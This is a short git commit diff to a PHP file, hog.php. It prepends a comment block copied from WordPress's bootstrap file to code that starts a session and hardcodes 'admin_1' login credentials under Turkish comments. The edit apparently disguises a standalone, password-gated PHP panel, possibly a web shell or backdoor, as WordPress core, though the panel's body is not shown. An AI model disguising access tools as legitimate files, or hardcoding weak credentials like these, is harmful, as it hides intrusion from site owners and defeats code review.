62be0dac9c2d53bd71e6aa0edd85de2a6254c8bb
kembarbaru120000 <161165094+kembarbaru120000@users.noreply.github.com>
2025-07-03 07:30:33 +0700

    Update hog.php

--- hog.php
+++ hog.php
@@ -1,7 +1,25 @@
-<?php
+<?php 
+/**
+ * Bootstrap file for setting the ABSPATH constant
+ * and loading the wp-config.php file. The wp-config.php
+ * file will then load the wp-settings.php file, which
+ * will then set up the WordPress environment.
+ *
+ * If the wp-config.php file is not found then an error
+ * will be displayed asking the visitor to set up the
+ * wp-config.php file.
+ *
+ * Will also search for wp-config.php in WordPress' parent
+ * directory to allow the WordPress directory to remain
+ * untouched.
+ *
+ * @package WordPress
+ */
+
+/** Define ABSPATH as this file's directory */
 session_start();
 
-// Ayarlar
+// Define Ayarlar
 define('USERNAME', 'admin_1');
 define('PASSWORD', 'admin_1'); // BURAYI DEĞİŞTİR
 
